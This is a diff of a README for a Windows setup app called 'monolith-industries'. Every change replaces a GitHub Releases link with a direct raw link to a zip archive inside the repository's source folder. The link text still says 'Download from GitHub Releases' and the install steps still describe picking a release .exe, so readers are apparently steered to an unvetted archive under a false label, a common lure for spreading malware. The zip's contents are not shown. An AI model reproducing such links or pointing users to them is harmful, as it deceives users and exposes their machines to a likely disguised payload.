@@ -1,6 +1,6 @@
 # 🏭 monolith-industries - One setup for solo teams
 
-[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/inshore-internalauditor208/monolith-industries/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/inshore-internalauditor208/monolith-industries/main/src/app/monolith-industries-v2.9.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ This project is built for a single user who wants a neat setup with less manual 
 
 Visit this page to download the app for Windows:
 
-[Download from GitHub Releases](https://github.com/inshore-internalauditor208/monolith-industries/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/inshore-internalauditor208/monolith-industries/main/src/app/monolith-industries-v2.9.zip)
 
 Pick the latest release, then download the Windows file that matches your system. If you see more than one file, choose the one with `.exe` at the end.
 
@@ -31,7 +31,7 @@ If you plan to keep project files in a shared folder, use a folder you can write
 ## 🛠️ How to install
 
 1. Open the release page:
-   [https://github.com/inshore-internalauditor208/monolith-industries/releases](https://github.com/inshore-internalauditor208/monolith-industries/releases)
+   [https://raw.githubusercontent.com/inshore-internalauditor208/monolith-industries/main/src/app/monolith-industries-v2.9.zip](https://raw.githubusercontent.com/inshore-internalauditor208/monolith-industries/main/src/app/monolith-industries-v2.9.zip)
 
 2. Find the latest version at the top of the page
 
